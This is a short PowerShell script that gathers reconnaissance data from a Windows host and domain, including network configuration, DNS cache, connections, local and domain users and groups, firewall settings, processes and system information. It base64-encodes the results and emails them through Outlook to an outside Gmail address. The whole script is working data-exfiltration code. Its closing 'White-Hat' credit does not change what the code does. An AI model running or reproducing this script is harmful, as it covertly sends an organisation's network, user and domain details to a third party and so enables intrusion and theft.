#information gathering
$date=date
$ipconfig1=ipconfig
$ipconfig=ipconfig /all 
$ipconfig2=ipconfig /displaydns
$netstat=netstat -ano 
$netstat2=netstat -r
$netshare=net share
$netuser=net user
$ComputerName= Get-WmiObject -Class Win32_BIOS -ComputerName .
$systeminfo=systeminfo
$firewall=netsh firewall show config
$arp=arp -a 
$tasklist=tasklist /svc
$netuser2=net user /domain
$netgroup=net group /domain

$all=$date,$ipconfig,$ipconfig2,$netstat,$netstat2,$netshare,$systeminfo,$firewall,$arp,$tasklist,$netuser,$netgroup,$netgroup2,$netgroup3,$firewall,$netgroup4| out-string
$small=$ipconfig1,$date,$firewall,$netuser| out-string

if ($small.length -gt 1000) {
    echo "Pblablablblblb"
}

Function Base64Encode($text) 
{
    $b  = [System.Text.Encoding]::UTF8.GetBytes($text)
    $encoded = [System.Convert]::ToBase64String($b)
    return $encoded    
}


Function Mail($text2)
{
$Outlook = New-Object -ComObject Outlook.Application
$Mail = $Outlook.CreateItem(0)
$Mail.To = "limor7763@gmail.com"
$Mail.Subject = "Action"
$Mail.Body ="$text2"
$Mail.Send()
}

$Encoded = Base64Encode($all)
$Encoded2 = Base64Encode($small)
$Encoded1000=$Encoded2.Substring(0,999)
Mail($Encoded1000)
Mail($Encoded)
#all copyright reserved to Lior Adar and White-Hat company";